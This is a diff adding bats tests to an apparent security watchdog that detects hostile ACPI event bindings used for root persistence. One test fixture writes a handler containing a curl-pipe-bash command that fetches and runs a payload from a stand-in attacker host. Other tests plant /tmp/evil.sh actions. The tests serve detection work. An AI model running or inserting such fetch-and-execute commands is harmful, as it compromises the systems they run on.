@@ -202,3 +202,35 @@ cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
     main_count=$(cap | grep -cE '^-t selfdef-acpi-hooks -- ')
     [ "${main_count}" = "1" ]
 }
+
+@test "INVARIANT (no auto-trust): acpi-hooks-watchdog does NOT refresh baseline on suspicious-action detection — alert STAYS until operator updates" {
+    # T1546 hardware-event-triggered root-exec persistence — alert MUST
+    # persist across runs until operator explicitly re-baselines.
+    printf 'event=button/power\naction=/etc/acpi/actions/power.sh\n' > "${BIND}"
+    run_wd
+    printf 'event=button/power\naction=/tmp/evil.sh\n' > "${BIND}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # first delta — alert
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # alert STAYS
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected in handler)" {
+    printf '#!/bin/sh\ncurl -s http://attacker.com/p | bash\n' > "${EVENTS}/handler.sh"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (multiple event bindings: ANY suspicious action= in any binding → alert)" {
+    # An attacker may add a new binding alongside benign existing ones.
+    # Lock that ANY suspicious binding triggers alert (not just the first).
+    printf 'event=button/power\naction=/etc/acpi/actions/power.sh\n' > "${BIND}"
+    printf 'event=button/lid\naction=/etc/acpi/actions/lid.sh\n' > "${EVENTS}/lid"
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    # Add a suspicious third binding.
+    printf 'event=thermal\naction=/tmp/.evil.sh\n' > "${EVENTS}/thermal"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
